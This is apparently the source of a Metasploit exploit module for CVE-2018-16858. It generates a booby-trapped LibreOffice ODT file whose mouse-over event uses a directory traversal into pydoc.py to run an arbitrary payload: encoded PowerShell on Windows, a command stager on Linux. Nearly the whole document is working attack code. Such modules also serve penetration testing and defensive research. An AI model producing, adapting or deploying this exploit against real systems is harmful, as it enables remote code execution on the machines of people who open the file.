# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Powershell
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;LibreOffice Macro Code Execution&#039;,
      &#039;Description&#039;    => %q{
        LibreOffice comes bundled with sample macros written in Python and
        allows the ability to bind program events to them. A macro can be tied
        to a program event by including the script that contains the macro and
        the function name to be executed. Additionally, a directory traversal
        vulnerability exists in the component that references the Python script
        to be executed. This allows a program event to execute functions from Python
        scripts relative to the path of the samples macros folder. The pydoc.py script
        included with LibreOffice contains the tempfilepager function that passes
        arguments to os.system, allowing RCE.

        This module generates an ODT file with a mouse over event that
        when triggered, will execute arbitrary code.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
      [
        &#039;Alex Inführ&#039;, # Vulnerability discovery and PoC
        &#039;Shelby Pace&#039;  # Metasploit Module
      ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2018-16858&#039; ],
          [ &#039;URL&#039;, &#039;https://insert-script.blogspot.com/2019/02/libreoffice-cve-2018-16858-remote-code.html&#039; ]
        ],
      &#039;Platform&#039;       => [ &#039;win&#039;, &#039;linux&#039; ],
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039;        =>
        [
          [
            &#039;Windows&#039;,
            {
              &#039;Platform&#039;        =>  &#039;win&#039;,
              &#039;Arch&#039;            =>  [ ARCH_X86, ARCH_X64 ],
              &#039;DefaultOptions&#039;  =>  { &#039;PrependMigrate&#039;  =>  true }
            }
          ],
          [
            &#039;Linux&#039;,
            {
              &#039;Platform&#039;        =>  &#039;linux&#039;,
              &#039;Arch&#039;            =>  [ ARCH_X86, ARCH_X64 ],
              &#039;DefaultOptions&#039;  =>  { &#039;PrependFork&#039; =>  true },
              &#039;CmdStagerFlavor&#039; =>  &#039;printf&#039;,
            }
          ]
        ],
      &#039;DisclosureDate&#039;  =>  "Oct 18, 2018",
      &#039;DefaultTarget&#039;   =>  0
    ))

    register_options(
    [
      OptString.new(&#039;FILENAME&#039;, [true, &#039;Output file name&#039;, &#039;librefile.odt&#039;])
    ])
  end

  def gen_windows_cmd
    opts =
    {
      :remove_comspec       =>  true,
      :method               =>  &#039;reflection&#039;,
      :encode_final_payload =>  true
    }
    @cmd = cmd_psh_payload(payload.encoded, payload_instance.arch.first, opts)
    @cmd << &#039; && echo&#039;
  end

  def gen_linux_cmd
    @cmd = generate_cmdstager.first
    @cmd << &#039; && echo&#039;
  end

  def gen_file(path)
    text_content = Rex::Text.rand_text_alpha(10..15)

    # file from Alex Inführ&#039;s PoC post referenced above
    fodt_file = File.read(File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2018-16858&#039;, &#039;librefile.erb&#039;))
    libre_file = ERB.new(fodt_file).result(binding())
    libre_file
  rescue Errno::ENOENT
    fail_with(Failure::NotFound, &#039;Cannot find template file&#039;)
  end

  def exploit
    path = &#039;../../../program/python-core-3.5.5/lib/pydoc.py&#039;
    if datastore[&#039;TARGET&#039;] == 0
      gen_windows_cmd
    elsif datastore[&#039;TARGET&#039;] == 1
      gen_linux_cmd
    else
      fail_with(Failure::BadConfig, &#039;A formal target was not chosen.&#039;)
    end
    fodt_file = gen_file(path)

    file_create(fodt_file)
  end
end

